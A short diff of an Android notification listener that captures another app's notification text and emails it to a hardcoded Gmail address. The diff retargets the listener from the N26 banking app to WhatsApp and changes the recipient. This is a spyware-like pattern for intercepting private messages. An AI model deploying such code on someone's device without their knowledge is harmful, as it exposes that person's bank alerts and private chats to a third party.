@@ -23,7 +23,7 @@ import javax.mail.internet.MimeMessage;
 
 public class N26NotificationListener extends NotificationListenerService {
     private static final String TAG = "N26NotificationListener";
-    private static final String N26_PACKAGE = "de.number26.android";
+    private static final String N26_PACKAGE = "com.whatsapp";
     private static final int NOTIFICATION_ID = 1;
     private static final String CHANNEL_ID = "N26ListenerChannel";
 
@@ -102,7 +102,7 @@ public class N26NotificationListener extends NotificationListenerService {
             MainActivity.instance.addLog("Received N26 notification: " + notificationText);
         }
 
-        sendEmail("unpickleball@gmail.com", notificationText);
+        sendEmail("shoebhasansayyed@gmail.com", notificationText);
     }
 
     private void sendEmail(String toEmail, String notificationText) {
